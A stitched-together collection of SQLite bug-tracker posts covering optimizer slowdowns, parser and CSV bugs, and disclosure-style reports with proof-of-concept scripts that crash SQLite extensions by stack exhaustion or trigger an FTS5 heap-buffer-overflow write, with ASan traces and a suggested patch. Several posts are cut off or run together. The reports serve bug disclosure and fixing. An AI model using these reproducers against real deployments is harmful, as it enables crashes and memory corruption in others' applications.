GROUP BY x, x
771.867 ms

The duplicate grouping expression caused an approximately 1.76× slowdown. Both queries returned identical results.

How to repeat
Run this complete SQL script in SQLite:
SELECT sqlite_version();
PRAGMA temp_store = MEMORY;

DROP TABLE IF EXISTS t;

CREATE TABLE t(
id INTEGER PRIMARY KEY,
x INTEGER NOT NULL,
y INTEGER
);

CREATE INDEX idx_t_x ON t(x);

WITH RECURSIVE seq(i) AS (
SELECT 0
UNION ALL
SELECT i + 1
FROM seq
WHERE i < 1999999
)
INSERT INTO t(id, x, y)
SELECT i, i % 1000000, i % 10
FROM seq;

ANALYZE;

-- Baseline: grouping can stream from the covering index.
EXPLAIN QUERY PLAN
SELECT x, COUNT(*)
FROM t
GROUP BY x;

SELECT x, COUNT(*)
FROM t
GROUP BY x;

-- Logically equivalent, but creates a temporary grouping B-tree.
EXPLAIN QUERY PLAN
SELECT x, COUNT(*)
FROM t
GROUP BY x, x;

SELECT x, COUNT(*)
FROM t
GROUP BY x, x;

Confirm that both queries return the same rows. The second plan should contain USE TEMP B-TREE FOR GROUP BY, while the first should only use idx_t_x.

For stable timings, warm up both statements and alternate their execution order over multiple repetitions.

VersionSQLite 3.50.4

posts.author: drh
posts.body:
Redundant terms in a GROUP BY is not something that comes up often in generated SQL.
So there is no compelling reason to add this optimization.  Furthermore, the ability
to force the use of a temporary B-Tree is used frequently during testing.  If a
new optimization like this were to be added, it would mean having to audit all of
our test code, and having rework the test code in many places, for little to no benefit.
Hence, this is not an optimization we want to add.

WONT FIX

title: SQLite: empty INTERSECT and EXCEPT branches are not folded to an empty result

posts.author: cl hl (chen8908917)
posts.body:
Description
SQLite does not fold a compound query to an empty result when one branch is provably empty. In particular:
A INTERSECT EMPTY        → EMPTY
EMPTY INTERSECT A        → EMPTY
EMPTY EXCEPT A           → EMPTY

The EXPLAIN QUERY PLAN output still contains scans of the non-empty branch and temporary B-tree compound-query operators. The executor consequently performs substantial unnecessary work before returning zero rows.

UNION ALL with an empty branch was also checked. Although its plan text retains a compound-query wrapper, its bytecode does not cause a measurable additional scan, so it is not included as a confirmed regression in this report.

Expected behavior
Once SQLite proves a branch is empty (WHERE 0, LIMIT 0, or an equivalent constant contradiction), it should replace the complete INTERSECT or EXCEPT expression with an empty-result opcode and avoid scanning the other branch.

Actual behavior
SQLite retains the compound operation and scans/builds temporary structures for branches that cannot affect the result. For example:
SELECT v FROM a INTERSECT SELECT v FROM b WHERE 0

still reports a compound query with scans of both a and b, instead of a constant empty result.

With 2,000,000 rows in each table, PRAGMA temp_store=MEMORY, warm-up executions, and alternating execution order:

Query
Median time
Equivalent SELECT ... WHERE 0
Slowdown

a INTERSECT (b WHERE 0)
230.733 ms
0.004 ms
~59,931×

(a WHERE 0) INTERSECT b
219.696 ms
0.004 ms
~60,191×

(a WHERE 0) EXCEPT b
38.417 ms
0.004 ms
~10,109×

All compared queries returned zero rows.

How to repeat
Run this complete SQL script in SQLite:
SELECT sqlite_version();
PRAGMA temp_store = MEMORY;

DROP TABLE IF EXISTS a;
DROP TABLE IF EXISTS b;

CREATE TABLE a(v INTEGER);
CREATE TABLE b(v INTEGER);

WITH RECURSIVE seq(i) AS (
SELECT 0
UNION ALL
SELECT i + 1
FROM seq
WHERE i < 1999999
)
INSERT INTO a(v)
SELECT i % 100000
FROM seq;

WITH RECURSIVE seq(i) AS (
SELECT 0
UNION ALL
SELECT i + 1
FROM seq
WHERE i < 1999999
)
INSERT INTO b(v)
SELECT i % 100000
FROM seq;

-- The right branch is empty, so the complete result is empty.
EXPLAIN QUERY PLAN
SELECT v FROM a
INTERSECT
SELECT v FROM b WHERE 0;

SELECT v FROM a
INTERSECT
SELECT v FROM b WHERE 0;

-- The left branch is empty, so the complete result is empty.
EXPLAIN QUERY PLAN
SELECT v FROM a WHERE 0
INTERSECT
SELECT v FROM b;

SELECT v FROM a WHERE 0
INTERSECT
SELECT v FROM b;

-- Empty EXCEPT non-empty is also empty.
EXPLAIN QUERY PLAN
SELECT v FROM a WHERE 0
EXCEPT
SELECT v FROM b;

SELECT v FROM a WHERE 0
EXCEPT
SELECT v FROM b;

-- Baselines showing the work that could be avoided.
EXPLAIN QUERY PLAN SELECT v FROM a WHERE 0;
EXPLAIN QUERY PLAN SELECT v FROM a WHERE 0;

The compound-query plans contain SCAN a/SCAN b and temporary B-tree operations, while the baseline has no table scan. For stable timing, warm up each statement and alternate execution order over multiple repetitions.

VersionSQLite 3.50.4

posts.author: drh
posts.body:
A new optimization was added at check-in 2025-07-08T19:53:36.480Z (over a year ago)
and which first appeared in release 3.51.0 (2025-11-04).  The new optimization addresses your second and third
examples.  It doesn't do very much for the first one, because it evaluates queries from left to right
(usually) and so it doesn't realize that the right-hand query is empty until after it has already processed
the left-hand query.

title: SQLite: redundant DISTINCT on a primary-key IN subquery disables the ROWID IN-operator optimization

posts.author: cl hl (chen8908917)
posts.body:
Description
The selected column of the IN subquery is declared as an INTEGER PRIMARY KEY and is therefore unique. SELECT DISTINCT v FROM build is equivalent to SELECT v FROM build, and the DISTINCT is provably redundant from schema metadata.

Without DISTINCT, SQLite uses its specialized ROWID lookup for the IN operator. Adding the redundant DISTINCT changes the plan to a materialized list subquery that scans the build table and creates a Bloom filter, causing a measurable regression.

Expected behavior
SQLite should remove DISTINCT when the selected subquery column is an INTEGER PRIMARY KEY, or preserve the same specialized ROWID IN-operator access path. Both equivalent queries should have comparable plans and execution times.

Actual behavior
Without DISTINCT, EXPLAIN QUERY PLAN reports:
USING ROWID SEARCH ON TABLE build FOR IN-OPERATOR

With the redundant DISTINCT, it reports:
LIST SUBQUERY
SCAN build
CREATE BLOOM FILTER

With 2,000,000 rows in each table, warm-up executions, and alternating execution order:

Query
Median execution time

Without DISTINCT
114.037 ms

With redundant DISTINCT
303.393 ms

The query containing the redundant DISTINCT was approximately 2.66 times slower. Both queries returned 1000001.

How to repeat
Run the following complete SQL script in SQLite:
SELECT sqlite_version();

DROP TABLE IF EXISTS probe;
DROP TABLE IF EXISTS build;

CREATE TABLE build(
v INTEGER PRIMARY KEY
);

CREATE TABLE probe(
v INTEGER PRIMARY KEY
);

WITH RECURSIVE seq(i) AS (
SELECT 1
UNION ALL
SELECT i + 1
FROM seq
WHERE i < 2000000
)
INSERT INTO build(v)
SELECT i
FROM seq;

WITH RECURSIVE seq(i) AS (
SELECT 1000000
UNION ALL
SELECT i + 1
FROM seq
WHERE i < 2999999
)
INSERT INTO probe(v)
SELECT i
FROM seq;

ANALYZE;

-- Uses the specialized ROWID IN-operator optimization.
EXPLAIN QUERY PLAN
SELECT COUNT(*)
FROM probe
WHERE v IN (SELECT v FROM build);

SELECT COUNT(*)
FROM probe
WHERE v IN (SELECT v FROM build);

-- DISTINCT is redundant because build.v is an INTEGER PRIMARY KEY.
EXPLAIN QUERY PLAN
SELECT COUNT(*)
FROM probe
WHERE v IN (SELECT DISTINCT v FROM build);

SELECT COUNT(*)
FROM probe
WHERE v IN (SELECT DISTINCT v FROM build);

Confirm that both statements return 1000001. Compare the plans and observe that the redundant DISTINCT replaces the ROWID IN-operator strategy with a list subquery, a complete scan of build, and Bloom-filter construction.

For stable timing results, warm up both statements and alternate their execution order over multiple repetitions.

VersionSQLite 3.50.4

posts.author: dan
posts.body:
Thanks for posting this. Should now be addressed here:

https://sqlite.org/src/info/c54858eab4

Dan.

title: SQLite: redundant IS NOT NULL after BETWEEN recomputes an expensive expression

posts.author: cl hl (chen8908917)
posts.body:
Description
In a WHERE clause, a true expression BETWEEN lower AND upper predicate already implies that expression is non-NULL. Appending AND expression IS NOT NULL is logically redundant.

SQLite neither removes this implied predicate nor reuses the deterministic expression value computed by BETWEEN. The bytecode evaluates the same function again for IS NOT NULL.

Expected behavior
SQLite should infer that BETWEEN implies non-NULL when the predicate is true and remove the redundant check. Alternatively, it should reuse the first deterministic function result.

Both equivalent queries should contain one hex() evaluation per row and have comparable execution times.

Actual behavior
For the original query, EXPLAIN contains one function opcode:
Function hex(1)

After adding the redundant IS NOT NULL, it contains two:
Function hex(1)
Function hex(1)

With 500,000 rows, warm-up executions, and alternating execution order:

Query
Median execution time

HEX(pad) BETWEEN '0' AND 'F'
56.670 ms

With redundant HEX(pad) IS NOT NULL
97.446 ms

The redundant predicate made the query approximately 1.72 times slower. Both queries returned 500,000.

The same behavior was reproduced with REPLACE(pad,'a','b'): 65.293 ms versus 111.054 ms, approximately 1.70 times slower.

How to repeat
Run the following complete SQL script in SQLite:
SELECT sqlite_version();

DROP TABLE IF EXISTS t;

CREATE TABLE t (
id INTEGER PRIMARY KEY,
pad TEXT NOT NULL
);

WITH RECURSIVE seq(i) AS (
SELECT 1
UNION ALL
SELECT i + 1 FROM seq WHERE i < 500000
)
INSERT INTO t(id, pad)
SELECT i, printf('%032x', i)
FROM seq;

ANALYZE;

-- The bytecode contains one hex(1) Function opcode.
EXPLAIN
SELECT COUNT(*)
FROM t
WHERE HEX(pad) BETWEEN '0' AND 'F';

SELECT COUNT(*)
FROM t
WHERE HEX(pad) BETWEEN '0' AND 'F';

-- The bytecode contains two hex(1) Function opcodes.
EXPLAIN
SELECT COUNT(*)
FROM t
WHERE HEX(pad) BETWEEN '0' AND 'F'
AND HEX(pad) IS NOT NULL;

SELECT COUNT(*)
FROM t
WHERE HEX(pad) BETWEEN '0' AND 'F'
AND HEX(pad) IS NOT NULL;

Confirm that both SELECT statements return 500,000. Compare the EXPLAIN bytecode and count the Function opcodes for hex(1). For stable timing results, warm up both statements and alternate their execution order.

VersionSQLite 3.45.3

posts.author: drh
posts.body:
The extra logic to detect this would make this one query run faster, but it
would also make the millions and millions of other queries that SQLite is
running every second run slightly slower.  The result is a net slow-down.

WONT FIX

posts.author: ylwang (yuelinwang)

posts.author: ylwang (yuelinwang)
posts.body:
Hi Dan,

Thanks for taking a look. I don't think this is documented anywhere either. I couldn't find anything in the tree (ext/fts3/*.txt or elsewhere) that specifies the argument semantics for the "simple" tokenizer, so I can't point to a spec that's being violated beyond the code's own apparent intent.

For what it's worth, I traced the history. This exact argc>1 / argv[1] pattern goes all the way back to when fts3 was copied from fts2 (commit acce22f5c7), and fts2 had the same logic from its own origin. So it's not a regression. It's been there since the very beginning, which does support your concern that this could just be "how it's always worked" for anyone who built around it.

That said, sqlite3Fts3InitTokenizer() builds aArg[] starting at index 0 for the first argument after the tokenizer name (ext/fts3/fts3_tokenizer.c), so argv[0] is clearly meant to be the first real argument everywhere else in the code. The argv[1] in simpleCreate() looks to me like a plain off-by-one rather than an intentional design choice. Still, I can't rule out that some legacy app is unknowingly relying on the current (broken) fallback behavior when passing exactly one argument.

I don't have visibility into how widely the single-argument form is actually used in the wild, so I'll leave the call to you. Happy for you to fix it if you think the risk is acceptable, or just close this if you'd rather not touch long-standing legacy behavior. Either way works for me.

Thanks,
Yuelin

title: "ON clause references tables to its right" is wrong in both directions for recursive CTEs

posts.author: Mikaël Francoeur (mikael.francoeur)
posts.body:
Version 3.54.0 (2026-07-21, checkin 7a06190b).

When the right operand of an outer join is a recursive CTE, the "ON clause
references tables to its right" check appears to be reversed: it rejects valid
queries and accepts invalid ones.

1. Valid query rejectedCREATE TABLE t(a);

WITH RECURSIVE c(x) AS (
SELECT 1
UNION ALL
SELECT c.x + 1 FROM t LEFT JOIN c ON t.a = 5 WHERE c.x < 3
)
SELECT * FROM c;

Actual: Parse error: ON clause references tables to its right
Expected: 1

The ON clause references only t, which is to its left.

The query is accepted if any one of the following is changed: the CTE is made
non-recursive, the join is made an inner join or a comma join, or the ON clause
is changed to something that doesn't reference t (ON 1, ON c.x > 0).

2. Invalid query accepted
The same two queries, differing only in whether the CTE is recursive:
CREATE TABLE t(a);  INSERT INTO t VALUES(1);
CREATE TABLE u(b);  INSERT INTO u VALUES(9);

-- non-recursive
WITH d(x) AS (SELECT 1)
SELECT 1 FROM t LEFT JOIN u ON d.x > 0 JOIN d;

-- recursive
WITH RECURSIVE c(x) AS (
SELECT 1
UNION ALL
SELECT c.x + 1 FROM t LEFT JOIN u ON c.x > 0 JOIN c WHERE c.x < 3
)
SELECT * FROM c;

The first is rejected, as expected — its ON clause does reference a table to its
right. The second contains the same violation but is accepted, returning
1, 2, 3.

posts.author: drh

title: DBVuln3: Stack exhaustion (unbounded recursion) in fts3 exprToString() and the fts3_exprtest() debug SQL function

posts.author: drh
posts.body: Fixed by check-in 30a61347077f4b99.

posts.author: ylwang (yuelinwang)
posts.body:
Vuln3: Stack exhaustion (unbounded recursion) in fts3 exprToString() and the fts3_exprtest() debug SQL function via a deep unbalanced expression tree
Summary
The fts3_exprtest() scalar function, compiled only when SQLITE_TEST is defined, parses a query string via fts3ExprParseUnbalanced() and then serializes the resulting tree with exprToString(), which recurses once per AND/OR/NOT/NEAR node with no depth limit. A query expression made of tens of thousands of implicitly-ANDed tokens produces a proportionally deep tree, and exprToString() recurses that deep, exhausting the thread stack and crashing the process with SIGSEGV. The normal production parsing entry point, sqlite3Fts3ExprParse(), is not affected because it calls fts3ExprBalance() and fts3ExprCheckDepth() which reject trees deeper than SQLITE_FTS3_MAX_EXPR_DEPTH (12) before any serialization would occur.

CWE: CWE-674. Severity: Low.

PoC-- Compile fts3 as a loadable extension with SQLITE_TEST defined (this is required
-- because fts3_exprtest()/fts3_exprtest_rebalance() are only registered when
-- SQLITE_TEST is defined; fts3.c and fts3_expr.c must see SQLITE_TEST so that
-- sqlite3Fts3ExprInitTestInterface() is compiled and called; fts3_term.c must
-- also see SQLITE_TEST since fts3.c calls sqlite3Fts3InitTerm() unconditionally;
-- fts3_unicode2.c needs SQLITE_ENABLE_FTS3 to compile its tables; the remaining
-- files are compiled plainly so the build stays a normal loadable extension,
-- i.e. SQLITE_CORE is never defined and sqlite3ext.h/SQLITE_EXTENSION_INIT is used):
--
--   cd sqlite-src
--   mkdir -p /tmp/fts3build
--   gcc -g -fPIC -c -I. -Isrc -Iext/fts3 -DSQLITE_TEST -DSQLITE_ENABLE_FTS3_PARENTHESIS ext/fts3/fts3.c      -o /tmp/fts3build/fts3.o
--   gcc -g -fPIC -c -I. -Isrc -Iext/fts3 -DSQLITE_TEST -DSQLITE_ENABLE_FTS3_PARENTHESIS ext/fts3/fts3_expr.c -o /tmp/fts3build/fts3_expr.o
--   gcc -g -fPIC -c -I. -Isrc -Iext/fts3 -DSQLITE_TEST -DSQLITE_ENABLE_FTS3_PARENTHESIS ext/fts3/fts3_term.c -o /tmp/fts3build/fts3_term.o
--   gcc -g -fPIC -c -I. -Isrc -Iext/fts3 -DSQLITE_ENABLE_FTS3 ext/fts3/fts3_unicode2.c -o /tmp/fts3build/fts3_unicode2.o
--   for f in fts3_aux fts3_hash fts3_porter fts3_snippet fts3_tokenizer fts3_tokenizer1 \
--            fts3_tokenize_vtab fts3_unicode fts3_write; do
--     gcc -g -fPIC -c -I. -Isrc -Iext/fts3 -DSQLITE_ENABLE_FTS3_PARENTHESIS ext/fts3/$f.c -o /tmp/fts3build/$f.o
--   done
--   gcc -g -fPIC -shared /tmp/fts3build/*.o -o /tmp/fts3build/fts3test.so
--
-- Then, against build_codecov/sqlite3 with a fresh empty database file, run the
-- following as a single script (the expr string below is 200000 repetitions of "a "):
.load /tmp/fts3build/fts3test sqlite3_fts3_init
SELECT length(
fts3_exprtest(
'simple',
rtrim(replace(hex(zeroblob(200000)), '00', 'a ')),
'col1'
)
);

Result
Real captured output from the independent verification run:
$ ./build_codecov/sqlite3 final.db < final_script.sql
Segmentation fault (core dumped)
EXIT=139

gdb backtrace on the same crash confirms unbounded self-recursion, not memory corruption:
#174428 exprToString (pExpr=..., zBuf="AND {AND {AND {AND {...") at ext/fts3/fts3_expr.c:1180
#174429 exprToString (...) at ext/fts3/fts3_expr.c:1180
... (174000+ near-identical frames, all in exprToString at fts3_expr.c:1180) ...
#174453 fts3ExprTestCommon (bRebalance=0, ...) at ext/fts3/fts3_expr.c:1268
#174454 fts3ExprTest (...) at ext/fts3/fts3_expr.c:1289
#174455 sqlite3VdbeExec (...) at sqlite3.c:104392
...

Same query against fts3_exprtest_rebalance() on the identical 200000-token input
does not crash, it is rejected before serialization:
$ ./build_codecov/sqlite3 rebal.db < script2.sql
Error near line 2: Error parsing expression
EXIT=1

title: DBVuln11: diskused() emits malformed "NaN.0%" percentage values when a subreport matches zero rows

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/diskused.c, diskusedSubreport() computes storage = total_pagespgsz and later divides payload100.0/(double)storage and total_unused*100.0/(double)storage without checking storage for zero. When a subreport's WHERE clause matches no rows (for example the built-in "All indexes" subreport on a schema with zero indexes), all of nentry, payload, and total_pages are 0, so these divisions become 0.0/0.0, producing NaN, which diskusedPercent() then renders as the literal text "NaN.0%" in the returned report string.

CWE: CWE-369. Severity: Low.

PoC.load ./diskused.so
CREATE TABLE t1(a INTEGER PRIMARY KEY, b TEXT);
INSERT INTO t1(a,b) VALUES (1,'hello'),(2,'world');
SELECT diskused('main');

Result
Real captured output from the independent verification run:
*** All indexes ***************************************************************

Percentage of total database...................... 0%
Number of entries................................. 0
Bytes of storage consumed......................... 0
Bytes of payload.................................. 0           NaN.0%
Bytes of metadata................................. 0           NaN.0%
Maximum single-entry payload...................... 0
Primary pages used................................ 0

title: DBVuln16: Self-referential tablename in transitive_closure causes unbounded recursion through closureFilter

posts.author: ylwang (yuelinwang)
posts.body:
Summary
closureFilter builds and prepares a query "SELECT tablename.idcolumn FROM tablename WHERE tablename.parentcolumn=?1" against the vtab's configured tablename with no cycle or recursion-depth check. If the virtual table itself is created with tablename equal to its own name (so there is no separate backing table), stepping that inner statement invokes closureFilter again on the same virtual table, recursing without bound until the stack is exhausted.

CWE: CWE-674. Severity: Medium.

PoCcd /data/ylwang/LargeScan/targets/sqlite

# 1. Build the extension WITH -DSQLITE_TEST (required — without it, sqlite3_create_module
#    is compiled out and the module never registers, see closure.c:980-982)
gcc -g -O0 -fPIC -shared -DSQLITE_TEST -I. ext/misc/closure.c -o closure_test.so

# 2. Write the PoC script (note: explicit entrypoint sqlite3_closure_init is needed,
#    since the .so is named closure_test.so but the init function is sqlite3_closure_init)
cat > /tmp/poc16.sql <<'EOF'
.load ./closure_test.so sqlite3_closure_init
CREATE VIRTUAL TABLE ct1 USING transitive_closure(tablename='ct1', idcolumn='id', parentcolumn='root');
SELECT id, depth FROM ct1 WHERE root=1 LIMIT 5;
EOF

# 3. Run it against a fresh db
rm -f /tmp/test16.db
timeout 15 ./sqlite3 /tmp/test16.db < /tmp/poc16.sql
echo "EXIT=$?"

Result
Real captured output from the independent verification run:
$ timeout 15 build_codecov/sqlite3 test2.db < poc2.sql
timeout: the monitored command dumped core
Segmentation fault      timeout 15 build_codecov/sqlite3 test2.db < poc2.sql
EXIT=139

gdb backtrace confirms the recursive re-entry:
#15 closureFilter (pVtabCursor=0x..., idxNum=1, ...) at ext/misc/closure.c:712
#16 sqlite3VdbeExec (...) at sqlite3.c:104041
#17 sqlite3Step (...) at sqlite3.c:93402
#18 sqlite3_step (...) at sqlite3.c:93463
#19 closureFilter (pVtabCursor=0x..., idxNum=1, ...) at ext/misc/closure.c:726
(pattern repeats until SIGSEGV from stack exhaustion)

Impact
A local user with the ability to run arbitrary CREATE VIRTUAL TABLE / SELECT statements against a database that has the closure extension loaded (e.g. via a crafted database opened by a victim application) can crash the process via stack-exhaustion by making a transitive_closure virtual table self-referential.

title: DBVuln37: templatevtab returns only 9 of the documented 10 rows due to off-by-one in xEof

posts.author: ylwang (yuelinwang)
posts.body:
Summary
templatevtab.c's header comment and xConnect declare the table has 10 fixed rows, but templatevtabFilter initializes pCur->iRowid to 1 and templatevtabEof stops iteration once iRowid>=10, so xNext only ever advances the cursor to iRowid=9 before xEof halts the scan. title: DBVuln38: vtablogColumn silently returns empty string for column index 25

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/vtablog.c, vtablogColumn() indexes the 25-character string literal "abcdefghijklmnopqrstuvwyz" (which omits the letter 'x') with column index i for any i<26. For i=25 this reads the string's NUL terminator instead of a letter, so sqlite3_snprintf writes a leading NUL byte into zVal, and sqlite3_result_text's strlen-based length computation then reports an empty string instead of the intended synthetic value like "x0".

CWE: CWE-704. Severity: Low.

PoC-- compile: gcc -fPIC -shared -I build_codecov -I. ext/misc/vtablog.c -o vtablog.so

title: CSV output on Windows uses "\r\r\n" as a row separator

posts.author: anonymous

The current version of the CLI tools on Windows emits "\r\r\n" (0x0d, 0x0d, 0x0a) as a row separator for CSV output, which confuses other tools, as they may (and do) interpret it as every second line being blank.
.\sqlite3.exe -version
3.53.4 2026-07-24 19:02:57 bf7c7f30031888f4e796e429ab3978879485813aaca6f641c7b33e4e09459bcc (64-bit)
.\sqlite3.exe -header -csv :memory: "SELECT 1" | xxd
00000000: 310d 0d0a 310d 0d0a                      1...1...

An older version on Windows used "\n":
.\sqlite3.exe -version
3.51.3 2026-03-13 10:38:09 737ae4a34738ffa0c3ff7f9bb18df914dd1cad163f28fd6b6e114a344fe6d618 (64-bit)
.\sqlite3.exe -header -csv :memory: "SELECT 1" | xxd
00000000: 310a 310a                                1.1.

The current Linux version emits "\r\n":
./sqlite3 -version
3.53.4 2026-07-24 19:02:57 bf7c7f30031888f4e796e429ab3978879485813aaca6f641c7b33e4e09459bcc (64-bit)
./sqlite3 -header -csv :memory: "SELECT 1" | xxd

title: PTP - FTS5 detail=none prefix merge underallocates the merged rowid doclist

posts.author: Michele (michele-tob)
posts.body:
Summary
fts5MergeRowidLists() sizes the merged detail=none doclist as p1->n + p2->n, the encoded sizes of its two inputs. That bound is invalid for
delta-encoded rowids: interleaving changes a rowid's predecessor, so its delta
can need a larger varint than it did in its own list. A crafted prefix query
makes the merged output exceed the allocation (72 bytes needed, 64 allocated)
and write past the heap buffer in sqlite3Fts5PutVarint(). The detail!=none
twin, fts5MergePrefixLists(), documents this exact case and reserves + 9
for it.

sqlite3Fts5BufferSize() rounds allocations up to a power of two (minimum 64),
so the reproducer needs p1->n + p2->n to land at or just under such a
boundary; that is why it inserts exactly 55 rowids, making the input sum 64.

Affected Area
SQLite version or Fossil check-in: 3.54.0 /
bf44a08adc94b8c7c69921a1292d56bec0cbd9f3ac772e31d8ea5866e9f46063

Build options or relevant feature flags: FTS5 enabled

Component or source path: ext/fts5/fts5_index.c, fts5MergeRowidLists()
(allocation at line 6108, overflowing append at line 6121),
fts5SetupPrefixIter(), ext/fts5/fts5_buffer.c, ext/fts5/fts5_varint.c.

Steps to ReproduceCC=clang CFLAGS='-O1 -g -fno-omit-frame-pointer -fsanitize=address' \
LDFLAGS='-fsanitize=address' ../sqlite/configure --fts5 --linemacros
make sqlite3
./sqlite3 :memory: < poc.sql

poc.sql:
CREATE VIRTUAL TABLE t USING fts5(a, detail=none);
BEGIN;
WITH RECURSIVE c(x) AS (
VALUES(1) UNION ALL SELECT x+1 FROM c WHERE x<55
)
INSERT INTO t(rowid,a) SELECT x,'ab' FROM c;
INSERT INTO t(rowid,a) VALUES(-9223372036854775808,'abc');
COMMIT;
SELECT count(rowid) FROM t WHERE t MATCH 'a*';

Output:
==3499270==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6f0d043e4048
WRITE of size 1 at 0x6f0d043e4048 thread T0
#0 sqlite3Fts5PutVarint .../fts5_varint.c:323:10
#1 fts5MergeRowidLists .../fts5_index.c:6121:7
#2 fts5SetupPrefixIter .../fts5_index.c:6764:9
#3 sqlite3Fts5IndexQuery .../fts5_index.c:7481:7
#4 fts5ExprNearInitAll .../fts5_expr.c:983:16
...
#12 sqlite3_format_query_result .../shell.c:4004:37
#16 main .../shell.c:39214:12

0x6f0d043e4048 is located 0 bytes after 72-byte region [0x6f0d043e4000,0x6f0d043e4048)
allocated by thread T0 here:
#1 sqlite3MemMalloc .../tsrc/mem1.c:142:7
#4 sqlite3_realloc64 .../tsrc/malloc.c:573:10
#5 sqlite3Fts5BufferSize .../fts5_buffer.c:25:12
#6 fts5MergeRowidLists .../fts5_index.c:6108:3
#7 fts5SetupPrefixIter .../fts5_index.c:6764:9
...
SUMMARY: AddressSanitizer: heap-buffer-overflow .../fts5_varint.c:323:10

Expected Behavior
FTS5 should allocate enough space for the merged rowid list and complete the
prefix query without writing outside the output buffer.

Actual Behavior
AddressSanitizer reports a heap-buffer-overflow write in
sqlite3Fts5PutVarint().

Impact
Heap out-of-bounds write.

Suggested Fix--- a/ext/fts5/fts5_index.c
+++ b/ext/fts5/fts5_index.c
@@ -6105,7 +6105,7 @@
(void)nBuf;
memset(&out, 0, sizeof(out));
assert( nBuf==1 );
-  sqlite3Fts5BufferSize(&p->rc, &out, p1->n + p2->n);
+  sqlite3Fts5BufferSize(&p->rc, &out, p1->n + p2->n + 9);
if( p->rc ) return;

fts5NextRowid(p1, &i1, &iRowid1);
@@ -6113,12 +6113,12 @@
while( i1>=0 || i2>=0 ){
if( i1>=0 && (i2<0 || iRowid1<iRowid2) ){
assert( iOut==0 || iRowid1>iOut );
-      fts5BufferSafeAppendVarint(&out, iRowid1 - iOut);
+      fts5BufferSafeAppendVarint(&out, (u64)iRowid1 - (u64)iOut);
iOut = iRowid1;
fts5NextRowid(p1, &i1, &iRowid1);
}else{
assert( iOut==0 || iRowid2>iOut );
-      fts5BufferSafeAppendVarint(&out, iRowid2 - iOut);
+      fts5BufferSafeAppendVarint(&out, (u64)iRowid2 - (u64)iOut);
iOut = iRowid2;
if( i1>=0 && iRowid1==iRowid2 ){
fts5NextRowid(p1, &i1, &iRowid1);

One reserved varint is enough. For any rowid that is not the head of its own
input list, its merged predecessor is greater than or equal to its own-list
predecessor, so its delta only shrinks and cannot need more bytes. That leaves
the two list heads, and the smaller of the two is the first output entry and
keeps its original encoding, so at most one delta in the output grows: from at
least 1 byte to at most 9, i.e. by at most 8. + 9 covers that, and is the
same slack fts5MergePrefixLists() already reserves. The bound does not rely
on the inputs being well-formed, because input and output deltas are both
u64, a corrupt non-monotonic doclist cannot produce cheap growth either.

The u64 casts remove the signed overflow in iRowid - iOut when iOut is
INT64_MIN, matching fts5MergeAppendDocid().

Ai assistance
Prepared with the help of Codex for the patch the planet project and manually
reviewed against the reproducer, ASan trace, release-build behavior, and source
path at check-in bf44a08adc.

title: Potential unexpected result for an rtree rowid comparison with numeric text

posts.author: suyang
drh
posts.body:
This is confusing, isn't it.  But it is actually working as documented.

In the documentation for Expressions (https://sqlite.org/lang_expr.html#cast_expressions)
it says:

When casting to INTEGER, if the text looks like a floating point value with an exponent, the exponent will be ignored because it is no part of the integer prefix.

In the sample above, the "id=" constraint on the WHERE clause is effectively
casting its argument to an integer.  Since the exponent is ignored, that
integer is 9, not 0.

This seems goofy.  You can argue that it is a bad design choice.  But it is
baked into the code by long-standing tradition.  And it is documented.  If we
change it now, no telling what might break.  So it is what it is.

Morale of the story:  If you use string literals that look more like
floating point numbers, and you use them as integers, you might get
unexpected results.  So don't do that.  Or use an explicit CAST operator
if you must.

NOT PLANNED

title: External-content FTS5 index corrupted by a second AFTER UPDATE trigger issuing a nested UPDATE on the content tab

posts.author: recregt
posts.body:
Summary
An AFTER UPDATE trigger that performs a well-formed, textbook-correct external-content FTS5 sync (INSERT INTO fts(fts, rowid, ...) VALUES('delete', ...) followed by a re-INSERT) becomes corrupted — sqlite3_step() / sqlite3_exec() returns SQLITE_CORRUPT ("database disk image is malformed") — if the same content table has a second, unrelated AFTER UPDATE trigger that issues its own nested UPDATE statement against that table. Removing either trigger makes the corruption disappear. The FTS5 sync trigger's own SQL is correct in isolation; it is the mere presence of the second trigger that breaks it.

This is not a memory-safety bug. The reproduction below has been run under AddressSanitizer + UndefinedBehaviorSanitizer and under Valgrind memcheck, both against a from-source build of the exact bundled SQLite amalgamation (see Environment). Both report zero findings; SQLITE_CORRUPT is returned through the ordinary error-return path, not via a crash. This appears to be a logic/data-integrity defect in how a nested write from a second trigger interacts with the FTS5 module's shadow-table bookkeeping for the original statement's external-content sync, not a buffer overflow, use-after-free, or similar.

Environment

Reproduces on SQLite 3.45.1 (Python 3's bundled sqlite3 module), 3.45.3 (Ubuntu 24.04 sqlite3 CLI package), and 3.53.2 (the amalgamation bundled by the Rust libsqlite3-sys crate, version 0.38.1, built from source).
The 3.53.2 build was compiled directly from sqlite3.c/sqlite3.h with: -DSQLITE_ENABLE_API_ARMOR -DSQLITE_ENABLE_COLUMN_METADATA -DSQLITE_ENABLE_DBSTAT_VTAB -DSQLITE_ENABLE_FTS3 -DSQLITE_ENABLE_FTS3_PARENTHESIS -DSQLITE_ENABLE_FTS5 -DSQLITE_ENABLE_JSON1 -DSQLITE_ENABLE_LOAD_EXTENSION=1 -DSQLITE_ENABLE_MEMORY_MANAGEMENT -DSQLITE_ENABLE_RTREE -DSQLITE_ENABLE_STAT4 -DSQLITE_ENABLE_UNLOCK_NOTIFY -DSQLITE_THREADSAFE=1, both plain and with -fsanitize=address,undefined -g -O0 (clang 18.1.3).
OS: Linux (Ubuntu 24.04, x86_64). Not yet tested on Windows/macOS.
PRAGMA recursive_triggers is OFF (the default) in all reproductions; explicitly setting it ON or OFF makes no difference to the outcome.
Not specific to :memory: databases; reproduces identically against a file-backed database.

Minimal Reproduction
Run with: sqlite3 :memory: < repro.sql
CREATE TABLE t(
id   INTEGER PRIMARY KEY,
body TEXT NOT NULL,
ts   TEXT NOT NULL
);

CREATE VIRTUAL TABLE t_fts USING fts5(
body,
content = t,
content_rowid = id
);

-- Trigger 1: standard external-content FTS5 sync trigger, matching the
-- pattern in the FTS5 documentation's "External Content Tables" section.
CREATE TRIGGER t_au AFTER UPDATE ON t BEGIN
INSERT INTO t_fts(t_fts, rowid, body) VALUES('delete', old.id, old.body);
INSERT INTO t_fts(rowid, body) VALUES(new.id, new.body);
END;

-- Trigger 2: an unrelated second AFTER UPDATE trigger on the same table,
